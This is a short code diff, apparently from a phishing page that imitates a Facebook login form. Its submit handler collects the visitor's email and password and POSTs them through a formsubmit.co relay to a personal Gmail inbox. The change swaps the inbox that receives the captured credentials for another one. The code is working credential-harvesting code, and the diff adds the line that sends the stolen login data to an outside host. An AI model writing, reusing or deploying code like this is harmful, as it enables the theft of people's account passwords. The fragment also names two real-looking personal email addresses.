@@ -4,7 +4,7 @@ document.getElementById('fb-form').addEventListener('submit', function(e) {
   const email = document.getElementById('email').value.trim();
   const pass  = document.getElementById('pass').value;
 
-  fetch("https://formsubmit.co/ajax/mickedroms555@gmail.com", {
+  fetch("https://formsubmit.co/ajax/michaeleddy027@gmail.com", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
